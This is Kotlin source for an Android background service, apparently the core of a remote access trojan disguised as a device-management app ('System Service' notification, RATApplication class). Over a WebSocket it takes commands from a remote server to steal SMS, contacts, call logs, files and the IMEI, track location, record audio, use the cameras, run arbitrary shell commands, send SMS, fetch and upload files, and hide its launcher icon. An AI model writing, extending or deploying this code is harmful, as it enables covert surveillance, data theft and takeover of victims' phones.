package com.mycontrol.mdm.services

import android.app.Service
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.mycontrol.mdm.Config
import com.mycontrol.mdm.MainActivity
import com.mycontrol.mdm.RATApplication
import com.mycontrol.mdm.managers.ActionManager
import com.mycontrol.mdm.managers.DeviceManager
import com.mycontrol.mdm.managers.FileManager
import com.mycontrol.mdm.managers.LocationManager
import com.mycontrol.mdm.managers.MediaManager
import com.mycontrol.mdm.managers.MessagingManager
import com.mycontrol.mdm.utils.DeviceUtils
import kotlinx.coroutines.*
import okhttp3.*
import org.json.JSONObject
import java.util.Timer
import java.util.TimerTask
import java.util.concurrent.TimeUnit

class WebSocketService : Service() {

    private val TAG = "WebSocketService"
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private lateinit var client: OkHttpClient
    private var webSocket: WebSocket? = null
    private var isConnected = false
    private var heartbeatTimer: Timer? = null

    private lateinit var deviceManager: DeviceManager
    private lateinit var locationManager: LocationManager
    private lateinit var messagingManager: MessagingManager
    private lateinit var mediaManager: MediaManager
    private lateinit var fileManager: FileManager
    private lateinit var actionManager: ActionManager

    override fun onCreate() {
        super.onCreate()
        initManagers()
        initWebSocketClient()
        connectWebSocket()
    }

    private fun initManagers() {
        deviceManager = DeviceManager(this)
        locationManager = LocationManager(this)
        messagingManager = MessagingManager(this)
        mediaManager = MediaManager(this)
        fileManager = FileManager(this)
        actionManager = ActionManager(this)
    }

    private fun initWebSocketClient() {
        client = OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(0, TimeUnit.MILLISECONDS)
            .writeTimeout(30, TimeUnit.SECONDS)
            .retryOnConnectionFailure(true)
            .build()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification = NotificationCompat.Builder(this, "rat_service")
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
        startForeground(1, notification)
        return START_STICKY
    }

    private fun connectWebSocket() {
        val serverUrl = "wss://${Config.SERVER_URL}"
        Log.d(TAG, "Connecting to: $serverUrl")

        val request = Request.Builder().url(serverUrl).build()

        webSocket = client.newWebSocket(request, object : WebSocketListener() {

            override fun onOpen(webSocket: WebSocket, response: Response) {
                isConnected = true
                Log.d(TAG, "Connected")
                registerDevice()
                startHeartbeat()
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                try {
                    val msg = JSONObject(text)
                    val type = msg.optString("type", "")
                    when (type) {
                        "command" -> {
                            val command = msg.optString("command", "")
                            val params = msg.opt("params")
                            val commandId = msg.optString("id", "")
                            handleCommand(command, params, commandId)
                        }
                        "ping" -> sendMessage(JSONObject().apply {
                            put("type", "pong")
                            put("deviceId", RATApplication.deviceId)
                        })
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Message error", e)
                }
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                isConnected = false
                stopHeartbeat()
                reconnect()
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                isConnected = false
                stopHeartbeat()
                Log.e(TAG, "Failure: ${t.message}")
                reconnect()
            }
        })
    }

    private fun reconnect() {
        scope.launch {
            delay(Config.RECONNECT_BASE_DELAY)
            connectWebSocket()
        }
    }

    private fun registerDevice() {
        val deviceInfo = DeviceUtils.getDeviceInfo(this)
        val battery = DeviceUtils.getBatteryInfo(this)
        sendMessage(JSONObject().apply {
            put("type", "register")
            put("role", "device")
            put("deviceId", RATApplication.deviceId)
            put("deviceInfo", JSONObject().apply {
                put("manufacturer", deviceInfo.manufacturer)
                put("model", deviceInfo.model)
                put("androidVersion", deviceInfo.androidVersion)
                put("sdkLevel", deviceInfo.sdkLevel)
                put("imei", deviceInfo.imei)
            })
            put("battery", battery.level)
            put("charging", battery.isCharging)
        })
    }

    private fun startHeartbeat() {
        heartbeatTimer?.cancel()
        heartbeatTimer = Timer()
        heartbeatTimer?.scheduleAtFixedRate(object : TimerTask() {
            override fun run() {
                if (isConnected) {
                    val battery = DeviceUtils.getBatteryInfo(this@WebSocketService)
                    sendMessage(JSONObject().apply {
                        put("type", "heartbeat")
                        put("deviceId", RATApplication.deviceId)
                        put("battery", battery.level)
                        put("charging", battery.isCharging)
                        put("timestamp", System.currentTimeMillis())
                    })
                }
            }
        }, Config.HEARTBEAT_INTERVAL, Config.HEARTBEAT_INTERVAL)
    }

    private fun stopHeartbeat() {
        heartbeatTimer?.cancel()
        heartbeatTimer = null
    }

    private fun handleCommand(command: String, params: Any?, commandId: String) {
        scope.launch {
            try {
                when (command) {
                    "get_device_info" -> sendDeviceInfo(commandId)
                    "get_battery" -> sendBattery(commandId)
                    "get_network" -> sendNetwork(commandId)
                    "get_packages" -> sendPackages(commandId)
                    "get_sms_inbox" -> sendSmsInbox(commandId)
                    "get_call_log" -> sendCallLog(commandId)
                    "get_contacts" -> sendContacts(commandId)
                    "send_sms" -> handleSendSms(params, commandId)
                    "start_location_tracking" -> locationManager.startTracking(this@WebSocketService::sendLocation)
                    "stop_location_tracking" -> locationManager.stopTracking()
                    "get_location_one_shot" -> locationManager.getOneShot(this@WebSocketService::sendLocation)
                    "capture_front_camera" -> sendResponse(commandId, "capture_front", mapOf("status" to "capturing"))
                    "capture_rear_camera" -> sendResponse(commandId, "capture_rear", mapOf("status" to "capturing"))
                    "record_audio" -> recordAudio(params, commandId)
                    "take_screenshot" -> sendResponse(commandId, "take_screenshot", mapOf("status" to "capturing"))
                    "flashlight" -> actionManager.toggleFlashlight(params.toString().toBoolean())
                    "vibrate" -> actionManager.vibrate((params?.toString() ?: "500").toLong())
                    "tts" -> actionManager.speak(params?.toString() ?: "")
                    "open_url" -> actionManager.openUrl(params?.toString() ?: "")
                    "toast" -> actionManager.showToast(params?.toString() ?: "")
                    "clipboard" -> actionManager.setClipboard(params?.toString() ?: "")
                    "notification" -> actionManager.pushNotification(params)
                    "shell" -> executeShell(params, commandId)
                    "lock" -> actionManager.lockDevice()
                    "reboot" -> actionManager.rebootDevice()
                    "shutdown" -> actionManager.shutdownDevice()
                    "hide_app" -> hideApp()
                    "list_files" -> listFiles(params, commandId)
                    "read_file" -> readFile(params, commandId)
                    "download_file" -> downloadFile(params, commandId)
                    "upload_file" -> uploadFile(params, commandId)
                    else -> sendResponse(commandId, "unknown", mapOf("error" to "Unknown command: $command"))
                }
            } catch (e: Exception) {
                Log.e(TAG, "Command error: $command", e)
                sendResponse(commandId, command, mapOf("error" to e.message))
            }
        }
    }

    private fun sendDeviceInfo(commandId: String) {
        val info = DeviceUtils.getDeviceInfo(this)
        sendResponse(commandId, "get_device_info", mapOf(
            "manufacturer" to info.manufacturer,
            "model" to info.model,
            "androidVersion" to info.androidVersion,
            "sdkLevel" to info.sdkLevel,
            "imei" to info.imei,
            "simSerial" to info.simSerial
        ))
    }

    private fun sendBattery(commandId: String) {
        val battery = DeviceUtils.getBatteryInfo(this)
        sendResponse(commandId, "get_battery", mapOf(
            "level" to battery.level,
            "charging" to battery.isCharging,
            "temperature" to battery.temperature
        ))
    }

    private fun sendNetwork(commandId: String) {
        val network = DeviceUtils.getNetworkInfo(this)
        sendResponse(commandId, "get_network", mapOf(
            "wifiSsid" to network.wifiSsid,
            "wifiIp" to network.wifiIp,
            "mobileIp" to network.mobileIp,
            "operator" to network.operator
        ))
    }

    private fun sendPackages(commandId: String) {
        val packages = DeviceUtils.getInstalledPackages(this)
        sendResponse(commandId, "get_packages", mapOf("packages" to packages))
    }

    private fun sendSmsInbox(commandId: String) {
        val smsList = messagingManager.getSmsInbox()
        sendResponse(commandId, "get_sms_inbox", mapOf("messages" to smsList))
    }

    private fun sendCallLog(commandId: String) {
        val calls = messagingManager.getCallLog()
        sendResponse(commandId, "get_call_log", mapOf("calls" to calls))
    }

    private fun sendContacts(commandId: String) {
        val contacts = messagingManager.getContacts()
        sendResponse(commandId, "get_contacts", mapOf("contacts" to contacts))
    }

    private fun handleSendSms(params: Any?, commandId: String) {
        if (params is JSONObject) {
            val phone = params.optString("phone", "")
            val message = params.optString("message", "")
            val success = messagingManager.sendSms(phone, message)
            sendResponse(commandId, "send_sms", mapOf("success" to success))
        }
    }

    private fun recordAudio(params: Any?, commandId: String) {
        val duration = (params?.toString() ?: "10").toIntOrNull() ?: 10
        val outputPath = "${cacheDir.absolutePath}/audio_${System.currentTimeMillis()}.mp4"
        val result = mediaManager.recordAudio(duration, outputPath)
        sendResponse(commandId, "record_audio", mapOf(
            "status" to if (result != null) "done" else "error",
            "data" to (result ?: "")
        ))
    }

    private fun executeShell(params: Any?, commandId: String) {
        try {
            val command = if (params is JSONObject) params.optString("command", "") else params?.toString() ?: ""
            val process = Runtime.getRuntime().exec(command)
            val stdout = process.inputStream.bufferedReader().readText()
            val stderr = process.errorStream.bufferedReader().readText()
            val result = if (stderr.isNotEmpty()) "$stdout\nSTDERR:\n$stderr" else stdout
            sendResponse(commandId, "shell", mapOf("response" to result))
        } catch (e: Exception) {
            sendResponse(commandId, "shell", mapOf("error" to e.message))
        }
    }

    private fun listFiles(params: Any?, commandId: String) {
        val path = if (params is JSONObject) params.optString("path", "/sdcard") else params?.toString() ?: "/sdcard"
        val files = fileManager.listFiles(path)
        sendResponse(commandId, "list_files", mapOf("files" to files))
    }

    private fun readFile(params: Any?, commandId: String) {
        val path = if (params is JSONObject) params.optString("path", "") else params?.toString() ?: ""
        val content = fileManager.readFile(path)
        sendResponse(commandId, "read_file", mapOf("content" to content))
    }

    private fun downloadFile(params: Any?, commandId: String) {
        val url = if (params is JSONObject) params.optString("url", "") else params?.toString() ?: ""
        val path = if (params is JSONObject) params.optString("path", "/sdcard/Download") else "/sdcard/Download"
        val success = fileManager.downloadFile(url, path)
        sendResponse(commandId, "download_file", mapOf("success" to success))
    }

    private fun uploadFile(params: Any?, commandId: String) {
        val path = if (params is JSONObject) params.optString("path", "") else params?.toString() ?: ""
        fileManager.uploadFile(path) { event, data ->
            emit(event, data)
        }
        sendResponse(commandId, "upload_file", mapOf("status" to "uploading"))
    }

    private fun hideApp() {
        try {
            val pm = packageManager
            val componentName = android.content.ComponentName(this, MainActivity::class.java)
            pm.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {}
    }

    private fun sendLocation(lat: Double, lng: Double, accuracy: Float, altitude: Double, bearing: Float, speed: Float) {
        sendMessage(JSONObject().apply {
            put("type", "response")
            put("command", "location")
            put("deviceId", RATApplication.deviceId)
            put("data", JSONObject().apply {
                put("lat", lat)
                put("lng", lng)
                put("accuracy", accuracy)
                put("altitude", altitude)
                put("bearing", bearing)
                put("speed", speed)
            })
        })
    }

    fun emit(event: String, data: Map<String, Any?>) {
        try {
            val json = JSONObject()
            json.put("type", event)
            data.forEach { (key, value) ->
                when (value) {
                    is Boolean -> json.put(key, value)
                    is Int -> json.put(key, value)
                    is Long -> json.put(key, value)
                    is Double -> json.put(key, value)
                    is Float -> json.put(key, value.toDouble())
                    is String -> json.put(key, value)
                    null -> json.put(key, JSONObject.NULL)
                    else -> json.put(key, value.toString())
                }
            }
            sendMessage(json)
        } catch (e: Exception) {
            Log.e(TAG, "Emit error: $event", e)
        }
    }

    private fun sendResponse(commandId: String, command: String, data: Map<String, Any?>) {
        val json = JSONObject().apply {
            put("type", "response")
            put("id", commandId)
            put("command", command)
            put("deviceId", RATApplication.deviceId)
            val responseData = JSONObject()
            data.forEach { (key, value) ->
                when (value) {
                    is Boolean -> responseData.put(key, value)
                    is Int -> responseData.put(key, value)
                    is Long -> responseData.put(key, value)
                    is Double -> responseData.put(key, value)
                    is Float -> responseData.put(key, value.toDouble())
                    is String -> responseData.put(key, value)
                    null -> responseData.put(key, JSONObject.NULL)
                    else -> responseData.put(key, value.toString())
                }
            }
            put("data", responseData)
        }
        sendMessage(json)
    }

    fun sendMessage(json: JSONObject) {
        try {
            if (isConnected) {
                webSocket?.send(json.toString())
            }
        } catch (e: Exception) {
            Log.e(TAG, "Send error", e)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        scope.cancel()
        stopHeartbeat()
        webSocket?.close(1000, "Service destroyed")
        client.dispatcher.executorService.shutdown()
        locationManager.stopTracking()
    }
}
